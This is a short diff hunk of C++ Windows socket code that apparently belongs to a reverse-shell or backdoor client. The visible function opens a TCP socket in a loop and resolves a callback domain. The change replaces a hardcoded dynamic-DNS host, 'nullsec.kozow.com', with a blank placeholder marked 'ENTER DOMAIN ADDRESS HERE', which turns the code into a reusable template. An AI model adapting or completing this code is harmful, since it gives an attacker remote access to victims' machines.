@@ -30,7 +30,7 @@ void vv()
 	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
 	    (unsigned int)NULL, (unsigned int)NULL);
     loop1:
-    hostent *record = gethostbyname("nullsec.kozow.com");
+    hostent *record = gethostbyname("");//ENTER DOMAIN ADDRESS HERE
     in_addr * address = (in_addr * )record->h_addr;
     string ip_address = inet_ntoa(* address);
     const char *host_name = ip_address.c_str();
